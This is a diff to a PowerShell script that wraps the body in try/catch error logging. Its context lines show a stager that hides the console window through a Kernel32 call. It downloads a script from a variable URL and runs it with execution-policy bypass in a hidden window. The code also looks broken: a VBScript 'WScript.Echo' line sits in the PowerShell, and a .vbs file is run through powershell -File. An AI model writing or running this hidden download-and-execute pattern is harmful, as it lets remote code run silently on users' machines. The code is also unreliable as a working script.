@@ -1,4 +1,6 @@
-Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
+
+try {
+    Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
 
 Add-Type -Name Window -Namespace Console -MemberDefinition '
 [DllImport("Kernel32.dll")]
@@ -55,3 +57,11 @@ Invoke-WebRequest -Uri $vbsUrl -OutFile $vbsFilePath -UseBasicParsing
 Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File '$vbsFilePath'" -Wait
 
 WScript.Echo "Executing execute.vbs script..."
+
+}
+catch {
+    $errorMessage = $_.Exception.Message
+    Add-Content -Path "C:\error.log" -Value "Error: $errorMessage"
+}
+
+
